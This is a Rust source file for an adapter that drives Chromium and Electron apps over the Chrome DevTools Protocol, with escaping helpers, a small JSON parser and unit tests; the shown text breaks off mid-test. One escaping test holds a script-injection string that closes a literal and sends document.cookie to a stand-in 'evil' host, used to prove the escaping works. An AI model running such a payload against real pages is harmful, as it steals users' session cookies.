//! The CDP hand: one `LiveHand` over the Chrome DevTools Protocol.
//!
//! Why this one first. Every Electron app is a Chromium that already speaks
//! CDP — VS Code, Slack, Discord, Figma, Notion, Teams — as does every
//! browser. One adapter therefore reaches a large slice of the desktop with
//! no per-app plugin anywhere, which is the whole claim the project makes:
//! one core, many hands, and the caller names a document, never a transport.
//!
//! Shape mirrors `hand::Hand` exactly: generic over the stream, so every
//! line except `connect` is tested with no browser and no network, on any
//! OS. A handle is `app:file:unit`, and the three parts mean:
//!   app  - whatever this hand was attached to claim (`code`, `chrome`, ...)
//!   file - matched against a target's title, url or id (first match wins)
//!   unit - a CSS selector naming the region, or `:doc` for the document
//! An op's own selector then resolves INSIDE that unit, the same way an
//! Excel range resolves inside a sheet.
//!
//! Two things worth knowing before pointing this at a real browser:
//!
//! 1. CDP is unauthenticated. Anything that can reach the debugging port
//!    controls the browser completely, including its logged-in sessions.
//!    Bind it to 127.0.0.1 and treat this hand as exactly as privileged as
//!    the browser it attaches to.
//! 2. Page content is untrusted input. Everything read here comes back as a
//!    `Reply` and goes out through `Runner`, which fences and truncates it,
//!    because a web page is the single most likely place to meet a prompt
//!    injection.

use crate::hand::{LiveHand, Reply};
use crate::ops::{Call, ExportArgs, FormatArgs, ReadArgs, StructArgs, WriteArgs};
use crate::ws::Ws;
use std::collections::HashMap;
use std::io::{Read, Write};

/// Cap what a page may hand back in one reply. `Runner` truncates again for
/// the transcript; this stops a whole DOM crossing the socket first.
const MAX_TEXT: usize = 4000;

// ---------------------------------------------------------------- JSON bits

/// Encode a Rust string as a JavaScript string literal.
///
/// This is the parameter binding of this module, and the reason no selector
/// is ever pasted into source text. A correctly escaped JSON string literal
/// is also a valid JS string literal and cannot terminate itself, so a
/// selector containing quotes or newlines becomes data, never code.
/// U+2028 and U+2029 are escaped as well: JSON permits them raw, but they
/// are line terminators to a JavaScript parser, which is exactly the kind of
/// difference that turns an escaping routine into an injection.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\u{2028}' => out.push_str("\\u2028"),
            '\u{2029}' => out.push_str("\\u2029"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Raw slice of a top-level member's value.
///
/// Depth- and string-aware: a `"id"` nested inside `result`, or appearing
/// inside a page's own text, must not be mistaken for the envelope's id.
/// Matching those by substring is the classic way a client pairs a reply
/// with the wrong request under load.
pub fn top_value<'a>(json: &'a str, key: &str) -> Option<&'a str> {
    let b = json.as_bytes();
    let mut i = 0;
    // Enter the outermost object.
    while i < b.len() && b[i] != b'{' {
        i += 1;
    }
    i += 1;
    let mut depth = 0usize;
    while i < b.len() {
        match b[i] {
            b' ' | b'\t' | b'\n' | b'\r' | b',' => i += 1,
            b'"' if depth == 0 => {
                let (name, next) = scan_string(json, i)?;
                let mut j = next;
                while j < b.len() && (b[j] == b' ' || b[j] == b':') {
                    j += 1;
                }
                let end = value_end(json, j)?;
                if name == key {
                    return Some(json[j..end].trim());
                }
                i = end;
            }
            b'{' | b'[' => {
                depth += 1;
                i += 1;
            }
            b'}' | b']' => {
                if depth == 0 {
                    return None;
                }
                depth -= 1;
                i += 1;
            }
            _ => i += 1,
        }
    }
    None
}

/// Scan the JSON string starting at `i` (which must be a quote). Returns the
/// decoded contents and the index just past the closing quote.
fn scan_string(json: &str, i: usize) -> Option<(String, usize)> {
    let b = json.as_bytes();
    if b.get(i) != Some(&b'"') {
        return None;
    }
    let mut out = String::new();
    let mut j = i + 1;
    while j < b.len() {
        match b[j] {
            b'"' => return Some((out, j + 1)),
            b'\\' => {
                j += 1;
                match b.get(j)? {
                    b'n' => out.push('\n'),
                    b'r' => out.push('\r'),
                    b't' => out.push('\t'),
                    b'b' => out.push('\u{8}'),
                    b'f' => out.push('\u{c}'),
                    b'u' => {
                        let hex = json.get(j + 1..j + 5)?;
                        let n = u32::from_str_radix(hex, 16).ok()?;
                        j += 4;
                        // Recombine a surrogate pair, or the page's emoji
                        // arrive as replacement characters.
                        if (0xD800..0xDC00).contains(&n) && json.get(j + 1..j + 3) == Some("\\u") {
                            let lo = u32::from_str_radix(json.get(j + 3..j + 7)?, 16).ok()?;
                            if (0xDC00..0xE000).contains(&lo) {
                                let c = 0x10000 + ((n - 0xD800) << 10) + (lo - 0xDC00);
                                out.push(char::from_u32(c)?);
                                j += 6;
                            } else {
                                out.push('\u{fffd}');
                            }
                        } else {
                            out.push(char::from_u32(n).unwrap_or('\u{fffd}'));
                        }
                    }
                    other => out.push(*other as char),
                }
                j += 1;
            }
            _ => {
                let rest = &json[j..];
                let c = rest.chars().next()?;
                out.push(c);
                j += c.len_utf8();
            }
        }
    }
    None
}

/// Index just past the value starting at `i`.
fn value_end(json: &str, i: usize) -> Option<usize> {
    let b = json.as_bytes();
    match b.get(i)? {
        b'"' => scan_string(json, i).map(|(_, e)| e),
        b'{' | b'[' => {
            let mut depth = 0usize;
            let mut j = i;
            while j < b.len() {
                match b[j] {
                    b'"' => j = scan_string(json, j)?.1,
                    b'{' | b'[' => {
                        depth += 1;
                        j += 1;
                    }
                    b'}' | b']' => {
                        depth -= 1;
                        j += 1;
                        if depth == 0 {
                            return Some(j);
                        }
                    }
                    _ => j += 1,
                }
            }
            None
        }
        _ => {
            let mut j = i;
            while j < b.len() && !matches!(b[j], b',' | b'}' | b']') {
                j += 1;
            }
            Some(j)
        }
    }
}

/// Decoded contents of a top-level member that is a JSON string.
pub fn top_string(json: &str, key: &str) -> Option<String> {
    let raw = top_value(json, key)?;
    scan_string(raw, 0).map(|(s, _)| s)
}

// ------------------------------------------------------------------ targets

/// One debuggable target as `/json/list` reports it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target {
    pub id: String,
    pub kind: String,
    pub title: String,
    pub url: String,
}

/// Parse the `/json/list` array. Objects are split on top-level boundaries
/// rather than by a generic parser, which is all this endpoint needs.
pub fn parse_targets(json: &str) -> Vec<Target> {
    let mut out = Vec::new();
    let b = json.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'{' {
            let Some(end) = value_end(json, i) else { break };
            let obj = &json[i..end];
            out.push(Target {
                id: top_string(obj, "id").unwrap_or_default(),
                kind: top_string(obj, "type").unwrap_or_default(),
                title: top_string(obj, "title").unwrap_or_default(),
                url: top_string(obj, "url").unwrap_or_default(),
            });
            i = end;
        } else {
            i += 1;
        }
    }
    out
}

/// Choose the target a handle's `file` part names.
///
/// Pages are preferred over service workers and extension backgrounds: a
/// title match against an invisible target would silently drive something
/// the human cannot see.
pub fn pick<'a>(targets: &'a [Target], want: &str) -> Option<&'a Target> {
    let w = want.to_lowercase();
    let hit = |t: &Target| {
        t.id == want || t.title.to_lowercase().contains(&w) || t.url.to_lowercase().contains(&w)
    };
    targets
        .iter()
        .find(|t| t.kind == "page" && hit(t))
        .or_else(|| targets.iter().find(|t| hit(t)))
}

// ------------------------------------------------------------- op -> script

/// The root element expression for a handle's unit.
fn root_js(unit: &str) -> String {
    if unit.is_empty() || unit == ":doc" {
        "document.documentElement".into()
    } else {
        format!("document.querySelector({})", js_string(unit))
    }
}

/// Wrap a body so it runs with `r` bound to the unit and `s` to the op's
/// selector, throwing when either fails to match.
///
/// Throwing rather than returning a sentinel is deliberate: CDP reports it
/// as `exceptionDetails`, so a miss can never be mistaken for a page whose
/// text happens to look like an error message.
fn wrap(unit: &str, selector: &str, body: &str) -> String {
    format!(
        "(function(){{var r={root};if(!r)throw new Error(\"unit not found: \"+{u});\
         var s={sel};var e=(s&&s!==\":self\")?r.querySelector(s):r;\
         if(!e)throw new Error(\"no element matches \"+s+\" in \"+{u});{body}}})()",
        root = root_js(unit),
        u = js_string(unit),
        sel = js_string(selector),
        body = body,
    )
}

/// Join a grid the way a page reads best: tabs across, newlines down.
fn text_of(values: &[Vec<String>]) -> String {
    values.iter().map(|r| r.join("\t")).collect::<Vec<_>>().join("\n")
}

/// Map one primitive op onto a script.
///
/// `Undo` and most `Struct` verbs return None. A page has no undo stack this
/// hand can honour — `document.execCommand("undo")` only does anything in an
/// editable context and silently reports success elsewhere, which would let
/// a caller believe an edit was rolled back when it was not.
pub fn script_for(call: &Call, unit: &str) -> Option<String> {
    Some(match call {
        Call::Read(ReadArgs { selector }) => wrap(
            unit,
            selector,
            &format!(
                "var t=(e.value!==undefined&&e.value!==null)?String(e.value):(e.innerText||e.textContent||\"\");\
                 return t.slice(0,{MAX_TEXT});"
            ),
        ),
        Call::Write(WriteArgs { selector, values }) => wrap(
            unit,
            selector,
            &format!(
                "var v={v};\
                 if('value' in e){{\
                   var d=Object.getOwnPropertyDescriptor(Object.getPrototypeOf(e),'value');\
                   if(d&&d.set){{d.set.call(e,v);}}else{{e.value=v;}}\
                   e.dispatchEvent(new Event('input',{{bubbles:true}}));\
                   e.dispatchEvent(new Event('change',{{bubbles:true}}));\
                 }}else{{e.innerText=v;}}\
                 return 'wrote '+v.length+' chars';",
                v = js_string(&text_of(values)),
            ),
        ),
        Call::Format(FormatArgs { selector, style }) => {
            let pairs = style
                .iter()
                .map(|(k, v)| format!("[{},{}]", js_string(k), js_string(v)))
                .collect::<Vec<_>>()
                .join(",");
            wrap(
                unit,
                selector,
                &format!(
                    "var st=[{pairs}];for(var i=0;i<st.length;i++){{e.style.setProperty(st[i][0],st[i][1]);}}\
                     return 'styled '+st.length+' properties';"
                ),
            )
        }
        Call::Struct(StructArgs::InsertParagraph { text, .. }) => wrap(
            unit,
            "",
            &format!(
                "var p=document.createElement('p');p.textContent={t};e.appendChild(p);\
                 return 'appended a paragraph';",
                t = js_string(text),
            ),
        ),
        Call::Export(ExportArgs { format, path, .. }) => {
            // Writing a file is the shell hand's job, not the browser's.
            if path.is_some() {
                return None;
            }
            let body = match format.as_str() {
                "html" => format!("return e.outerHTML.slice(0,{MAX_TEXT});"),
                "text" | "summary" | "preview" => {
                    format!("return (e.innerText||e.textContent||'').slice(0,{MAX_TEXT});")
                }
                "title" => "return document.title+' | '+location.href;".to_string(),
                // png is handled before any script is built; see dispatch.
                "png" => return None,
                _ => return None,
            };
            wrap(unit, "", &body)
        }
        Call::Struct(StructArgs::Invoke { selector, action }) => {
            let act = match action.as_str() {
                "invoke" | "click" | "toggle" | "select" => "e.click();",
                "focus" => "e.focus();",
                _ => return None,
            };
            wrap(unit, selector, &format!("{act}return {a}+' on '+(e.tagName||'element');", a = js_string(action)))
        }
        Call::Struct(_) | Call::Undo => return None,
    })
}

// ------------------------------------------------------------------ session

/// A connected CDP hand: one browser, many targets, many handles.
#[derive(Debug)]
pub struct Cdp<S: Read + Write> {
    ws: Ws<S>,
    targets: Vec<Target>,
    /// targetId -> sessionId, so a second op on the same page is one call.
    sessions: HashMap<String, String>,
    next_id: u64,
    calls: u64,
}

fn other(msg: String) -> std::io::Error {
    std::io::Error::other(msg)
}

impl<S: Read + Write> Cdp<S> {
    pub fn new(ws: Ws<S>, targets: Vec<Target>) -> Self {
        Self { ws, targets, sessions: HashMap::new(), next_id: 0, calls: 0 }
    }

    pub fn calls(&self) -> u64 {
        self.calls
    }

    pub fn targets(&self) -> &[Target] {
        &self.targets
    }

    /// Send one command and return the matching reply.
    ///
    /// Events arrive interleaved with replies on the same socket and are
    /// skipped by id, not by guessing from shape.
    pub fn call(&mut self, method: &str, params: &str, session: Option<&str>) -> std::io::Result<String> {
        self.next_id += 1;
        let id = self.next_id;
        let sess = match session {
            Some(s) => format!(",\"sessionId\":{}", js_string(s)),
            None => String::new(),
        };
        let msg = format!("{{\"id\":{id},\"method\":{},\"params\":{params}{sess}}}", js_string(method));
        self.ws.send_text(&msg)?;
        self.calls += 1;
        for _ in 0..512 {
            let got = self.ws.recv_text()?;
            if top_value(&got, "id").and_then(|v| v.trim().parse::<u64>().ok()) == Some(id) {
                if let Some(e) = top_value(&got, "error") {
                    let m = top_string(e, "message").unwrap_or_else(|| e.to_string());
                    return Err(other(format!("cdp {method} failed: {m}")));
                }
                return Ok(got);
            }
        }
        Err(other(format!("no reply to {method} after 512 messages")))
    }

    /// Attach to a target and cache its session. `flatten` keeps every
    /// session on this one socket instead of opening a socket per page.
    pub fn attach(&mut self, target_id: &str) -> std::io::Result<String> {
        if let Some(s) = self.sessions.get(target_id) {
            return Ok(s.clone());
        }
        let params = format!("{{\"targetId\":{},\"flatten\":true}}", js_string(target_id));
        let reply = self.call("Target.attachToTarget", &params, None)?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        let sid = top_string(result, "sessionId")
            .ok_or_else(|| other(format!("no sessionId in attach reply: {reply}")))?;
        self.sessions.insert(target_id.into(), sid.clone());
        Ok(sid)
    }

    /// Capture the page as a PNG.
    ///
    /// Not a script, so it cannot go through `script_for`: CDP returns the
    /// image as base64 inside the reply. Exposed as `export png`, because
    /// writing a handle out to a file is exactly what `export` means.
    pub fn screenshot(&mut self, session: &str) -> std::io::Result<Vec<u8>> {
        let reply = self.call(
            "Page.captureScreenshot",
            "{\"format\":\"png\",\"captureBeyondViewport\":false}",
            Some(session),
        )?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        let data = top_string(result, "data")
            .ok_or_else(|| other("no image data in the capture reply".into()))?;
        crate::ws::un_b64(&data).ok_or_else(|| other("capture reply was not valid base64".into()))
    }

    /// Evaluate one script in a page and decode the string it returned.
    pub fn eval(&mut self, session: &str, script: &str) -> std::io::Result<Reply> {
        let params = format!(
            "{{\"expression\":{},\"returnByValue\":true,\"awaitPromise\":true}}",
            js_string(script)
        );
        let reply = self.call("Runtime.evaluate", &params, Some(session))?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        if let Some(ex) = top_value(result, "exceptionDetails") {
            let msg = top_value(ex, "exception")
                .and_then(|e| top_string(e, "description"))
                .or_else(|| top_string(ex, "text"))
                .unwrap_or_else(|| "script threw".into());
            return Ok(Reply { ok: false, preview: String::new(), error: msg });
        }
        let inner = top_value(result, "result").unwrap_or("{}");
        let preview = top_string(inner, "value").unwrap_or_default();
        Ok(Reply { ok: true, preview, error: String::new() })
    }
}

/// Split `app:file:unit`. The unit keeps any further colons, so a selector
/// or url fragment survives intact.
pub fn split_handle(handle: &str) -> (&str, &str, &str) {
    let mut it = handle.splitn(3, ':');
    (it.next().unwrap_or(""), it.next().unwrap_or(""), it.next().unwrap_or(""))
}

impl<S: Read + Write + std::fmt::Debug> LiveHand for Cdp<S> {
    fn dispatch_call(&mut self, call: &Call, handle: &str) -> std::io::Result<Reply> {
        let (_, file, unit) = split_handle(handle);
        // `export png <path>` is the one op that is not a script.
        if let Call::Export(ExportArgs { format, path: Some(path), .. }) = call
            && format == "png"
        {
            let Some(target) = pick(&self.targets, file).cloned() else {
                return Ok(Reply { ok: false, preview: String::new(), error: format!("no target matches {file:?}") });
            };
            let session = self.attach(&target.id)?;
            let png = self.screenshot(&session)?;
            if let Some(dir) = std::path::Path::new(path).parent()
                && !dir.as_os_str().is_empty()
            {
                std::fs::create_dir_all(dir)?;
            }
            std::fs::write(path, &png)?;
            return Ok(Reply {
                ok: true,
                preview: format!("captured {path} ({} bytes)", png.len()),
                error: String::new(),
            });
        }
        let Some(script) = script_for(call, unit) else {
            return Ok(Reply {
                ok: false,
                preview: String::new(),
                error: format!("{:?} is not supported by the cdp hand", call.op()),
            });
        };
        let Some(target) = pick(&self.targets, file).cloned() else {
            let open: Vec<&str> = self.targets.iter().map(|t| t.title.as_str()).take(8).collect();
            return Ok(Reply {
                ok: false,
                preview: String::new(),
                error: format!("no debuggable target matches {file:?}; open targets: {open:?}"),
            });
        };
        let session = self.attach(&target.id)?;
        self.eval(&session, &script)
    }
}

// ------------------------------------------------------------------ connect

/// Parse `ws://host:port/path` into the pieces the handshake needs.
pub fn parse_ws_url(url: &str) -> Option<(String, String)> {
    let rest = url.strip_prefix("ws://")?;
    match rest.split_once('/') {
        Some((hostport, path)) => Some((hostport.to_string(), format!("/{path}"))),
        None => Some((rest.to_string(), "/".to_string())),
    }
}

/// One HTTP/1.1 GET against the debugging port, body returned.
///
/// The body is read by `Content-Length`, not by waiting for EOF. Chrome's
/// DevTools HTTP server holds the socket open after the response even when
/// asked to close it, so reading to EOF just blocks until the timeout and
/// reports a connection failure for a request that actually succeeded.
fn http_get(addr: &str, path: &str) -> std::io::Result<String> {
    use std::io::BufRead;
    use std::net::TcpStream;
    let s = TcpStream::connect(addr)?;
    s.set_read_timeout(Some(std::time::Duration::from_secs(10)))?;
    s.set_write_timeout(Some(std::time::Duration::from_secs(10)))?;
    // Chrome rejects a Host header it does not recognise as loopback, and
    // applies no Origin check to a client that sends no Origin at all.
    (&s).write_all(format!("GET {path} HTTP/1.1\r\nHost: {addr}\r\nAccept: */*\r\n\r\n").as_bytes())?;
    (&s).flush()?;
    let mut r = std::io::BufReader::new(&s);
    let mut status = String::new();
    r.read_line(&mut status)?;
    if !status.contains(" 200") {
        return Err(other(format!("{addr}{path} answered {}", status.trim())));
    }
    let mut len: Option<usize> = None;
    loop {
        let mut line = String::new();
        if r.read_line(&mut line)? == 0 {
            break;
        }
        let t = line.trim_end();
        if t.is_empty() {
            break;
        }
        if let Some((k, v)) = t.split_once(':')
            && k.trim().eq_ignore_ascii_case("content-length")
        {
            len = v.trim().parse().ok();
        }
    }
    let mut body = Vec::new();
    match len {
        Some(n) => {
            body.resize(n, 0);
            r.read_exact(&mut body)?;
        }
        None => {
            r.read_to_end(&mut body)?;
        }
    }
    Ok(String::from_utf8_lossy(&body).into_owned())
}

impl Cdp<std::net::TcpStream> {
    /// Connect to a browser listening with `--remote-debugging-port`.
    ///
    /// Discovery is HTTP (`/json/list`, `/json/version`) and control is one
    /// WebSocket to the browser endpoint, so every page shares a socket.
    pub fn connect(addr: &str) -> std::io::Result<Self> {
        let targets = parse_targets(&http_get(addr, "/json/list")?);
        let version = http_get(addr, "/json/version")?;
        let url = top_string(&version, "webSocketDebuggerUrl").ok_or_else(|| {
            other(format!("{addr} answered without a webSocketDebuggerUrl: is it a DevTools port?"))
        })?;
        let (hostport, path) = parse_ws_url(&url)
            .ok_or_else(|| other(format!("cannot parse debugger url {url}")))?;
        let sock = std::net::TcpStream::connect(&hostport)?;
        // A wedged renderer must surface as an error, not a hung session.
        sock.set_read_timeout(Some(std::time::Duration::from_secs(30)))?;
        sock.set_write_timeout(Some(std::time::Duration::from_secs(10)))?;
        let ws = Ws::handshake(sock, &hostport, &path)?;
        Ok(Self::new(ws, targets))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ops::StructArgs;
    use std::cell::RefCell;
    use std::rc::Rc;

    #[test]
    fn js_string_makes_a_selector_data_not_code() {
        // The whole point: a selector that tries to close the literal and
        // append a statement comes out as one inert string.
        let nasty = "a\");fetch(\"http://evil/\"+document.cookie);//";
        let lit = js_string(nasty);
        assert!(lit.starts_with('"') && lit.ends_with('"'));
        assert_eq!(lit.matches("\\\"").count(), 3, "every quote must be escaped");
        assert!(!lit[1..lit.len() - 1].contains("\";"), "the literal must not terminate early");
        assert_eq!(js_string("a\nb"), "\"a\\nb\"");
        // Legal in JSON, a line break to a JS parser.
        assert_eq!(js_string("a\u{2028}b"), "\"a\\u2028b\"");
    }

    #[test]
    fn top_value_ignores_nesting_and_strings() {
        let j = "{\"id\":7,\"result\":{\"id\":99,\"value\":\"x\"},\"note\":\"has \\\"id\\\":42 inside\"}";
        assert_eq!(top_value(j, "id"), Some("7"));
        assert_eq!(top_value(j, "value"), None, "nested keys are not top level");
        assert_eq!(top_string(j, "note").unwrap(), "has \"id\":42 inside");
        let inner = top_value(j, "result").unwrap();
        assert_eq!(top_value(inner, "id"), Some("99"));
    }

    #[test]
    fn scan_string_decodes_escapes_and_surrogates() {
        let j = "{\"v\":\"tab\\there \\u00e9 \\ud83d\\ude00\"}";
        assert_eq!(top_string(j, "v").unwrap(), "tab\there \u{e9} \u{1f600}");
    }

    fn targets() -> Vec<Target> {
        vec![
            Target { id: "SW1".into(), kind: "service_worker".into(), title: "plan worker".into(), url: "chrome-extension://x".into() },
            Target { id: "P1".into(), kind: "page".into(), title: "plan.md - Visual Studio Code".into(), url: "vscode-file://x".into() },
            Target { id: "P2".into(), kind: "page".into(), title: "Slack | general".into(), url: "https://app.slack.com/".into() },
        ]
    }

    #[test]
    fn pick_prefers_a_visible_page_over_a_worker() {
        let t = targets();
        // "plan" matches the service worker first in list order; a human
        // cannot see that target, so the page must win.
        assert_eq!(pick(&t, "plan").unwrap().id, "P1");
        assert_eq!(pick(&t, "slack").unwrap().id, "P2");
        assert_eq!(pick(&t, "SW1").unwrap().id, "SW1", "an exact id still resolves");
        assert!(pick(&t, "photoshop").is_none());
    }

    #[test]
    fn parse_targets_reads_the_json_list_shape() {
        let body = "[ {\"description\":\"\",\"id\":\"A1\",\"title\":\"Tab \\\"one\\\"\",\"type\":\"page\",\"url\":\"https://a/\"}, \
                     {\"id\":\"B2\",\"title\":\"two\",\"type\":\"iframe\",\"url\":\"https://b/\"} ]";
        let t = parse_targets(body);
        assert_eq!(t.len(), 2);
        assert_eq!(t[0].id, "A1");
        assert_eq!(t[0].title, "Tab \"one\"");
        assert_eq!(t[0].kind, "page");
        assert_eq!(t[1].id, "B2");
    }

    #[test]
    fn parse_ws_url_splits_host_and_path() {
        assert_eq!(
            parse_ws_url("ws://127.0.0.1:9222/devtools/browser/8f-2a"),
            Some(("127.0.0.1:9222".into(), "/devtools/browser/8f-2a".into()))
        );
        assert_eq!(parse_ws_url("http://127.0.0.1:9222/x"), None);
    }

    #[test]
    fn split_handle_keeps_colons_in_the_unit() {
        assert_eq!(split_handle("code:plan.md:#editor"), ("code", "plan.md", "#editor"));
        assert_eq!(split_handle("chrome:github:a[href^=\"https:\"]"), ("chrome", "github", "a[href^=\"https:\"]"));
    }

    #[test]
    fn a_read_script_binds_the_selector_as_a_literal() {
        let s = script_for(&Call::Read(ReadArgs { selector: "h1".into() }), "main").unwrap();
        assert!(s.contains("document.querySelector(\"main\")"));
        assert!(s.contains("var s=\"h1\""));
        assert!(s.contains("r.querySelector(s)"), "the op selector resolves inside the unit");
        // A doc-level unit needs no querySelector for the root.
        let s = script_for(&Call::Read(ReadArgs { selector: "h1".into() }), ":doc").unwrap();
        assert!(s.contains("document.documentElement"));
    }

    #[test]
    fn a_write_script_drives_the_native_setter_and_fires_events() {
        let c = Call::Write(WriteArgs {
            selector: "#msg".into(),
            values: vec![vec!["a".into(), "b".into()], vec!["c".into()]],
        });
        let s = script_for(&c, ":doc").unwrap();
        assert!(s.contains("var v=\"a\\tb\\nc\""), "grid joins tabs across, newlines down");
        // React and friends ignore a plain .value assignment; without the
        // prototype setter plus events the app never sees the text.
        assert!(s.contains("getOwnPropertyDescriptor"));
        assert!(s.contains("new Event('input',{bubbles:true})"));
        assert!(s.contains("new Event('change',{bubbles:true})"));
    }

    #[test]
    fn unsupported_ops_return_none_rather_than_a_no_op() {
        assert!(script_for(&Call::Undo, ":doc").is_none(), "a page has no undo we can honour");
        assert!(script_for(&Call::Struct(StructArgs::AddSheet { name: "S".into() }), ":doc").is_none());
        // Export to a file is the shell hand's job.
        let e = Call::Export(ExportArgs { format: "html".into(), path: Some("o.html".into()), sheet: None });
        assert!(script_for(&e, ":doc").is_none());
        let e = Call::Export(ExportArgs { format: "html".into(), path: None, sheet: None });
        assert!(script_for(&e, ":doc").is_some());
    }

    // ---- wire-level tests against a scripted browser -------------------

    #[derive(Debug)]
    struct Fake {
        inbound: std::io::Cursor<Vec<u8>>,
        wrote: Rc<RefCell<Vec<u8>>>,
    }

    impl Read for Fake {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            self.inbound.read(buf)
        }
    }

    impl Write for Fake {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            self.wrote.borrow_mut().extend_from_slice(buf);
            Ok(buf.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }

    fn frame(s: &str) -> Vec<u8> {
        let b = s.as_bytes();
        let mut out = vec![0x81];
        if b.len() < 126 {
            out.push(b.len() as u8);
        } else {
            out.push(126);
            out.extend_from_slice(&(b.len() as u16).to_be_bytes());
        }
        out.extend_from_slice(b);
        out
    }

    /// A CDP whose socket replays `msgs`, and the buffer of what it sent.
    fn cdp(msgs: &[&str]) -> (Cdp<Fake>, Rc<RefCell<Vec<u8>>>) {
        let mut inbound = Vec::new();
        for m in msgs {
            inbound.extend_from_slice(&frame(m));
        }
        let wrote = Rc::new(RefCell::new(Vec::new()));
        let f = Fake { inbound: std::io::Cursor::new(inbound), wrote: Rc::clone(&wrote) };
        let ws = Ws::from_upgraded(f);
        (Cdp::new(ws, targets()), wrote)
    }

    fn sent(w: &Rc<RefCell<Vec<u8>>>) -> Vec<String> {
        // Unmask every client frame back into text.
        let b = w.borrow().clone();
        let mut out = Vec::new();
        let mut i = 0;
        while i + 2 <= b.len() {
            let len = (b[i + 1] & 0x7F) as usize;
            let (len, mut j) = if len == 126 {
                (u16::from_be_bytes([b[i + 2], b[i + 3]]) as usize, i + 4)
            } else {
                (len, i + 2)
            };
            let mask = [b[j], b[j + 1], b[j + 2], b[j + 3]];
            j += 4;
            let body: Vec<u8> = b[j..j + len].iter().enumerate().map(|(k, x)| x ^ mask[k % 4]).collect();
            out.push(String::from_utf8_lossy(&body).into_owned());
            i = j + len;
        }
        out
    }

    #[test]
    fn a_read_attaches_once_then_evaluates() {
        let (mut c, w) = cdp(&[
            "{\"id\":1,\"result\":{\"sessionId\":\"S9\"}}",
            "{\"id\":2,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"Hello page\"}}}",
        ]);
        let r = c
            .dispatch_call(&Call::Read(ReadArgs { selector: "h1".into() }), "code:plan.md:#editor")
            .unwrap();
        assert!(r.ok);
        assert_eq!(r.preview, "Hello page");
        let msgs = sent(&w);
        assert!(msgs[0].contains("Target.attachToTarget"));
        assert!(msgs[0].contains("\"targetId\":\"P1\""), "resolved by title match");
        assert!(msgs[0].contains("\"flatten\":true"));
        assert!(msgs[1].contains("Runtime.evaluate"));
        assert!(msgs[1].contains("\"sessionId\":\"S9\""));
        assert_eq!(c.calls(), 2);
    }

    #[test]
    fn a_second_op_reuses_the_cached_session() {
        let (mut c, w) = cdp(&[
            "{\"id\":1,\"result\":{\"sessionId\":\"S9\"}}",
            "{\"id\":2,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"one\"}}}",
            "{\"id\":3,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"two\"}}}",
        ]);
        let call = Call::Read(ReadArgs { selector: "h1".into() });
        assert_eq!(c.dispatch_call(&call, "code:plan.md:#editor").unwrap().preview, "one");
        assert_eq!(c.dispatch_call(&call, "code:plan.md:#editor").unwrap().preview, "two");
        let msgs = sent(&w);
        assert_eq!(msgs.iter().filter(|m| m.contains("attachToTarget")).count(), 1);
    }

    #[test]
    fn events_interleaved_with_replies_are_skipped_by_id() {
        let (mut c, _) = cdp(&[
            "{\"method\":\"Target.targetCreated\",\"params\":{\"targetInfo\":{\"id\":\"zz\"}}}",
            "{\"id\":1,\"result\":{\"sessionId\":\"S9\"}}",
            "{\"method\":\"Runtime.consoleAPICalled\",\"params\":{\"args\":[{\"value\":\"id:2\"}]}}",
            "{\"id\":2,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"right one\"}}}",
        ]);
        let r = c.dispatch_call(&Call::Read(ReadArgs { selector: "h1".into() }), "code:plan:#e").unwrap();
        assert_eq!(r.preview, "right one", "a console log mentioning id:2 must not be mistaken for the reply");
    }

    #[test]
    fn a_thrown_script_is_an_error_reply_not_a_success() {
        let (mut c, _) = cdp(&[
            "{\"id\":1,\"result\":{\"sessionId\":\"S9\"}}",
            "{\"id\":2,\"result\":{\"result\":{\"type\":\"object\"},\"exceptionDetails\":{\"text\":\"Uncaught\",\
              \"exception\":{\"description\":\"Error: no element matches #gone in :doc\"}}}}",
        ]);
        let r = c.dispatch_call(&Call::Read(ReadArgs { selector: "#gone".into() }), "code:plan:doc").unwrap();
        assert!(!r.ok);
        assert!(r.error.contains("no element matches"), "{}", r.error);
    }

    #[test]
    fn an_unknown_target_is_refused_before_anything_is_sent() {
        let (mut c, w) = cdp(&[]);
        let r = c.dispatch_call(&Call::Read(ReadArgs { selector: "h1".into() }), "code:photoshop:#e").unwrap();
        assert!(!r.ok);
        assert!(r.error.contains("no debuggable target"));
        assert!(r.error.contains("Visual Studio Code"), "say what IS open");
        assert!(sent(&w).is_empty(), "nothing may go on the wire for a handle we cannot resolve");
    }

    #[test]
    fn an_unsupported_op_never_reaches_the_browser() {
        let (mut c, w) = cdp(&[]);
        let r = c.dispatch_call(&Call::Undo, "code:plan.md:#editor").unwrap();
        assert!(!r.ok);
        assert!(r.error.contains("not supported"));
        assert!(sent(&w).is_empty());
    }

    #[test]
    fn a_cdp_protocol_error_surfaces_as_an_error() {
        let (mut c, _) = cdp(&["{\"id\":1,\"error\":{\"code\":-32602,\"message\":\"No target with given id\"}}"]);
        let e = c.attach("P1").unwrap_err();
        assert!(e.to_string().contains("No target with given id"), "{e}");
    }

    #[test]
    fn a_dead_socket_is_a_transport_error() {
        let (mut c, _) = cdp(&[]);
        let e = c
            .dispatch_call(&Call::Read(ReadArgs { selector: "h1".into() }), "code:plan.md:#editor")
            .unwrap_err();
        assert_eq!(e.kind(), std::io::ErrorKind::UnexpectedEof);
    }

    #[test]
    fn invoke_clicks_and_only_known_actions_map() {
        let c = |a: &str| {
